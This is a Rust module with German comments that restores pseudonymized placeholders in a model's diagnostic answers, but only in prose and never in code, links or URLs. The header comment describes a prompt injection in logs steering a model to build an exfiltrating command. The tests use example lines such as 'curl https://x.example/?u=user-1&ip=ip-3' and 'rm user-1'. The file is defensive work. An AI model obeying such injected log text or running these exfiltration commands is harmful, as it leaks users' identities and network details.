// Copyright (C) 2026 Daniel Kurdoghlian
// Pushing Pixels, Vienna <https://pushingpixels.at>
//
// This program is free software; you can redistribute it and/or modify it
// under the terms of the GNU General Public License as published by the Free
// Software Foundation; either version 3 of the License, or (at your option)
// any later version.
//
// This program is distributed in the hope that it will be useful, but
// WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
// or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
// for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, see <https://www.gnu.org/licenses>.
//
// Additional permission under GNU GPL version 3 section 7
//
// If you modify this Program, or any covered work, by linking or combining
// it with NVIDIA CUDA (the libraries of the NVIDIA CUDA Toolkit, such as
// libcudart, libcublas and libcublasLt, and the CUDA driver library libcuda
// of the NVIDIA driver) (or a modified version of that library), containing
// parts covered by the terms of the NVIDIA CUDA Toolkit End User License
// Agreement or the NVIDIA Driver License Agreement, the licensors of this
// Program grant you additional permission to convey the resulting work.

//! Rückübersetzung der Platzhalter in Antworten des Modells fürs Panel (`PLAN-diagnose.md`, Antwort 4 und Vorgabe I1
//! aus Aufgabe 4): Der Daemon liefert zur Antwort markierte Spannen „Platzhalter → Klartext“, das Panel zeigt sie auf
//! Tastendruck. Gesendet wird nie der Klartext; er steht nur in der Antwort des Daemons an das Panel, nie im Log, nie in
//! „Copy report“ (der kommt aus der Vorschau).
//!
//! - **Nur in Fließtext:** in `findings[].cause` und `notes`, nie in `checks` (Proben, Begründungen), und auch in diesen
//!   beiden Texten nie in Code (Codeblöcke mit Fence, Code-Spannen mit Backticks), in Links `[Text](Ziel)` und in URLs
//!   (`schema://…`, `mailto:…`). Eine Prompt-Injection im Log kann das Modell sonst einen Befehl oder eine Adresse
//!   bauen lassen, in die das Panel echte Werte einsetzt (`curl https://x.example/?u=user-1`; Review I1 zu Aufgabe 4).
//!   Die Regeln für Code und Links folgen `src/ui/markdown.rs` (Fences wie [`crate::actions::markdown`],
//!   Code-Spannen und Links je Zeile); im Zweifel schützt Rust mehr. Das Panel prüft außerdem selbst und setzt in Code
//!   und Links nie einen Wert ein, auch wenn eine Spanne dorthin zeigte.
//! - **Spannen in Bytes** (UTF-8, `start` ab 0, `end` exklusiv) im Text, wie er in der Antwort steht; das Panel (bis W7 Lua, unter niri ab W4 `dictate-ui`)
//!   rechnet in Bytes. Jede Spanne nennt auch den Platzhalter, damit das Panel prüfen kann, dass sie stimmt.
//! - **`Debug` ohne Inhalte**: nur Lage und Länge.

use serde_json::{json, Value};
use std::fmt;
use std::ops::Range;

/// Eine Stelle, an der ein Platzhalter steht, und sein Klartext.
#[derive(Clone, PartialEq, Eq)]
pub struct RestoreSpan {
    pub start: usize,
    pub end: usize,
    pub placeholder: String,
    pub value: String,
}

impl fmt::Debug for RestoreSpan {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        // nie der Klartext
        f.debug_struct("RestoreSpan").field("start", &self.start).field("end", &self.end).finish()
    }
}

impl RestoreSpan {
    pub fn to_json(&self) -> Value {
        json!({"start": self.start, "end": self.end, "placeholder": self.placeholder, "value": self.value})
    }
}

/// Die Spannen als JSON-Liste.
pub fn spans_json(spans: &[RestoreSpan]) -> Value {
    Value::Array(spans.iter().map(RestoreSpan::to_json).collect())
}

/// Aus den Platzhaltern eines Textes (Anfang, Ende, Wert; [`super::pseudo::Pseudonyms::known_placeholders`]) die, die
/// ganz in Fließtext stehen ([`protected_ranges`]).
pub fn spans(text: &str, markdown: bool, found: Vec<(usize, usize, String)>) -> Vec<RestoreSpan> {
    let protected = protected_ranges(text, markdown);
    found
        .into_iter()
        .filter(|(s, e, _)| !protected.iter().any(|p| *s < p.end && p.start < *e))
        .map(|(start, end, value)| RestoreSpan { start, end, placeholder: text[start..end].to_string(), value })
        .collect()
}

/// Bereiche, in denen nie zurückübersetzt wird: Codeblöcke (nur `markdown`), Code-Spannen, Links und URLs.
pub fn protected_ranges(text: &str, markdown: bool) -> Vec<Range<usize>> {
    let mut out: Vec<Range<usize>> = Vec::new();
    let fenced: Vec<Range<usize>> = if markdown { crate::actions::markdown::fenced_ranges(text).into_iter().map(|(a, b)| a..b).collect() } else { Vec::new() };
    out.extend(fenced.iter().cloned());
    let mut at = 0;
    for raw in text.split_inclusive('\n') {
        let start = at;
        at += raw.len();
        if fenced.iter().any(|f| f.start <= start && start < f.end) {
            continue;
        }
        let line = raw.strip_suffix('\n').unwrap_or(raw);
        for r in line_ranges(line) {
            out.push(start + r.start..start + r.end);
        }
    }
    out
}

/// Code-Spannen, Links und URLs in einer Zeile (Bytes relativ zur Zeile).
fn line_ranges(line: &str) -> Vec<Range<usize>> {
    let b = line.as_bytes();
    let mut out = Vec::new();
    // Code-Spannen: eine Folge von n Backticks bis zur nächsten Folge von genau n; ohne Gegenstück schützt sie bis zum
    // Zeilenende (im Zweifel mehr)
    let mut i = 0;
    while i < b.len() {
        if b[i] != b'`' {
            i += 1;
            continue;
        }
        let n = b[i..].iter().take_while(|&&c| c == b'`').count();
        let mut j = i + n;
        let mut close = None;
        while j < b.len() {
            if b[j] == b'`' {
                let m = b[j..].iter().take_while(|&&c| c == b'`').count();
                if m == n {
                    close = Some(j + m);
                    break;
                }
                j += m;
            } else {
                j += 1;
            }
        }
        let end = close.unwrap_or(b.len());
        out.push(i..end);
        i = end;
    }
    // Links `[Text](Ziel)`: das Ganze
    let mut i = 0;
    while let Some(p) = line[i..].find('[').map(|p| p + i) {
        i = p + 1;
        let Some(close) = line[p + 1..].find(']').map(|c| c + p + 1) else { break };
        if close == p + 1 || !line[close + 1..].starts_with('(') {
            continue;
        }
        let target = &line[close + 2..];
        let len = target.find(|c: char| c == ')' || c.is_whitespace()).unwrap_or(target.len());
        if len > 0 && target[len..].starts_with(')') {
            out.push(p..close + 2 + len + 1);
            i = close + 2 + len + 1;
        }
    }
    // URLs: `schema://…` und `mailto:…` bis zum nächsten Leerraum
    let lower = line.to_ascii_lowercase();
    let mut from = 0;
    while let Some(p) = lower[from..].find("://").map(|p| p + from) {
        let mut s = p;
        while s > 0 && (b[s - 1].is_ascii_alphanumeric() || matches!(b[s - 1], b'+' | b'.' | b'-')) {
            s -= 1;
        }
        let e = p + 3 + line[p + 3..].find(char::is_whitespace).unwrap_or(line.len() - p - 3);
        out.push(s..e);
        from = e.max(p + 3);
    }
    let mut from = 0;
    while let Some(p) = lower[from..].find("mailto:").map(|p| p + from) {
        let e = p + line[p..].find(char::is_whitespace).unwrap_or(line.len() - p);
        out.push(p..e);
        from = e.max(p + 1);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn found(text: &str, values: &[(&str, &str)]) -> Vec<(usize, usize, String)> {
        let mut out = Vec::new();
        for (ph, v) in values {
            let mut from = 0;
            while let Some(p) = text[from..].find(ph).map(|p| p + from) {
                out.push((p, p + ph.len(), v.to_string()));
                from = p + ph.len();
            }
        }
        out.sort();
        out
    }

    fn restored(text: &str, markdown: bool) -> Vec<String> {
        let f = found(text, &[("user-1", "anna"), ("host-2", "werkbank"), ("ip-3", "10.0.0.7")]);
        spans(text, markdown, f).iter().map(|s| format!("{}@{}", s.placeholder, s.start)).collect()
    }

    #[test]
    fn only_prose_is_restored_in_notes() {
        let notes = "host-2 froze; user-1 was logged in.\n\n\
            Run `journalctl -u x --user user-1` or ``a ` user-1`` to check.\n\n\
            ```sh\ncurl https://x.example/?u=user-1&ip=ip-3\nping host-2\n```\n\n\
            See https://x.example/host-2 and [the log of user-1](https://x.example/ip-3), mailto:user-1@x.example too.\n\
            Then ip-3 is fine.";
        let r = restored(notes, true);
        let at = |needle: &str| notes.find(needle).unwrap();
        assert_eq!(
            r,
            ["host-2@0".to_string(), format!("user-1@{}", at("user-1 was")), format!("ip-3@{}", at("ip-3 is fine"))],
            "nur Fließtext, nie Code, Codeblock, URL, Link oder mailto"
        );
        // Spannen zeigen genau auf den Platzhalter
        for s in spans(notes, true, found(notes, &[("user-1", "anna")])) {
            assert_eq!(&notes[s.start..s.end], "user-1");
            assert_eq!(s.placeholder, "user-1");
        }
    }

    #[test]
    fn unclosed_code_and_open_fences_protect_more() {
        // eine Code-Spanne ohne Ende schützt bis zum Zeilenende, eine offene Fence bis zum Textende
        assert_eq!(restored("user-1 `rm user-1\nuser-1", true), ["user-1@0", "user-1@18"]);
        assert_eq!(restored("user-1\n```\nuser-1\nhost-2", true), ["user-1@0"]);
        // ohne Markdown (Ursache) gelten Fences nicht, Code-Spannen und URLs schon
        assert_eq!(restored("```\nuser-1 `host-2` http://h/user-1", false), ["user-1@4"]);
    }

    #[test]
    fn utf8_and_debug_without_values() {
        let t = "Größe: user-1 → host-2 ✓";
        let s = spans(t, true, found(t, &[("user-1", "anna"), ("host-2", "werkbank")]));
        assert_eq!(s.len(), 2);
        assert_eq!(&t[s[1].start..s[1].end], "host-2");
        let dbg = format!("{s:?}");
        assert!(!dbg.contains("anna") && !dbg.contains("werkbank") && !dbg.contains("user-1"), "{dbg}");
        assert_eq!(spans_json(&s)[0], json!({"start": s[0].start, "end": s[0].end, "placeholder": "user-1", "value": "anna"}));
    }

    #[test]
    fn link_like_text_without_target_stays_prose() {
        assert_eq!(restored("[user-1] (host-2) [x](a b) user-1", true), ["user-1@1", "host-2@10", "user-1@27"]);
    }
}
